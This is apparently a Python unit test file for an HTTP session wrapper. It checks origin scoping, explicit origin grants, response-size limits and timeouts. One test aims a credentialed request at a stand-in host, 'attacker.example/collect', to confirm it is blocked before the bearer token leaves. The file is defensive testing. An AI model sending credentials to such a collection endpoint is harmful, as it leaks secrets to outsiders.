import unittest
from unittest.mock import Mock

import requests

from mimic import ResponseTooLarge, ScopeViolation, Session


def response(body=b'{"ok": true}', *, status=200, headers=None):
    result = requests.Response()
    result.status_code = status
    result.headers.update(headers or {})
    result._content = body
    result._content_consumed = True
    result.encoding = "utf-8"
    return result


class SessionScopeTests(unittest.TestCase):
    def test_cross_origin_request_is_blocked_before_credentials_are_sent(self):
        session = Session(
            "https://api.example.com",
            headers={"Authorization": "Bearer secret"},
        )
        session._http.request = Mock(return_value=response())

        with self.assertRaises(ScopeViolation):
            session.get("https://attacker.example/collect")

        session._http.request.assert_not_called()

    def test_same_origin_absolute_url_and_relative_path_are_allowed(self):
        session = Session("https://api.example.com")
        session._http.request = Mock(side_effect=[response(), response()])

        self.assertEqual(session.get("https://api.example.com/v1/me"), {"ok": True})
        self.assertEqual(session.get("v1/me"), {"ok": True})

        urls = [call.args[1] for call in session._http.request.call_args_list]
        self.assertEqual(urls, ["https://api.example.com/v1/me"] * 2)

    def test_additional_origin_requires_an_explicit_grant(self):
        session = Session(
            "https://api.example.com",
            allowed_origins=["https://uploads.example.com"],
        )
        session._http.request = Mock(return_value=response())

        session.post("https://uploads.example.com/v1/file", json={"name": "x"})

        self.assertEqual(
            session._http.request.call_args.args[1],
            "https://uploads.example.com/v1/file",
        )

    def test_response_size_is_bounded_before_parsing(self):
        session = Session("https://api.example.com", max_response_bytes=4)
        oversized = response(b"12345", headers={"Content-Length": "5"})
        oversized.close = Mock()
        session._http.request = Mock(return_value=oversized)

        with self.assertRaises(ResponseTooLarge):
            session.get("/large")

        oversized.close.assert_called_once_with()

    def test_default_timeout_and_streaming_are_enforced(self):
        session = Session("https://api.example.com", timeout=7)
        session._http.request = Mock(return_value=response())

        session.get("/health")

        self.assertEqual(session._http.request.call_args.kwargs["timeout"], 7)
        self.assertTrue(session._http.request.call_args.kwargs["stream"])


if __name__ == "__main__":
    unittest.main()
